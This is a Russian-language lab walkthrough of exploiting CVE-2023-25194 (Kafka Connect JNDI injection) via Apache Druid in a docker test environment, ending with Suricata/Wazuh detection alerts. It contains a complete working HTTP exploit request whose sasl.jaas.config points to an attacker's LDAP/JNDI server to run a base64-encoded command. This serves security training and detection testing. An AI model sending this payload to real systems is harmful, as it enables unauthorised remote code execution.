# CVE-2023-25194

Apache Kafka — это платформа с открытым исходным кодом, которая используется для потоковой передачи и обработки данных в реальном времени.

В API Apache Kafka Connect обнаружена возможная уязвимость, для которой требуется доступ к рабочему процессу Kafka Connect и возможность создавать/изменять на нем коннекторы с помощью произвольной конфигурации SASL JAAS клиента Kafka и протокола безопасности на основе SASL, что стало возможным в кластерах Kafka Connect начиная с Apache Kafka Connect 2.3.0. Злоумышленник может вызвать неограниченную десериализацию ненадежных данных или уязвимость RCE, если в пути к классам есть гаджеты.

### Эксплуатация уязвимости

Для запуска уязвимой среды выполните команду:

```
docker compose up -d
```

После успешного запуска по адресу http://ваш-ip:8888 будет доступна домашняя страница Apache Druid

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Для начала запустите JNDI-сервер с помощью [JNDIExploit](https://github.com/vulhub/JNDIExploit)

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Затем отправьте соответствующий запрос на уязвимый хост:

```
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: ваш-ip:8888
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 1792

{
    "type":"kafka",
    "spec":{
        "type":"kafka",
        "ioConfig":{
            "type":"kafka",
            "consumerProperties":{
                "bootstrap.servers":"127.0.0.1:6666",
                "sasl.mechanism":"SCRAM-SHA-256",
                "security.protocol":"SASL_SSL",
                "sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://jndi-сервер-ip:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3MK\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
            },
            "topic":"test",
            "useEarliestOffset":true,
            "inputFormat":{
                "type":"regex",
                "pattern":"([\\s\\S]*)",
                "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                "columns":[
                    "raw"
                ]
            }
        },
        "dataSchema":{
            "dataSource":"sample",
            "timestampSpec":{
                "column":"!!!_no_such_column_!!!",
                "missingValue":"1970-01-01T00:00:00Z"
            },
            "dimensionsSpec":{

            },
            "granularitySpec":{
                "rollup":false
            }
        },
        "tuningConfig":{
            "type":"kafka"
        }
    },
    "samplerConfig":{
        "numRows":500,
        "timeoutMs":15000
    }
}
```

> Здесь "aWQgPiAvdG1wL3N1Y2Nlc3MK" - полезная нагрузка "id > /tmp/success", закодированная в base64
>
>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

После отправки запроса на уязвимом хосте создался файл /tmp/success с выводом результата команды id&#x20;

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.

Suricata определила это как эксплуатацию уязвимости CVE-2021-44228 (Log4Shell)

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
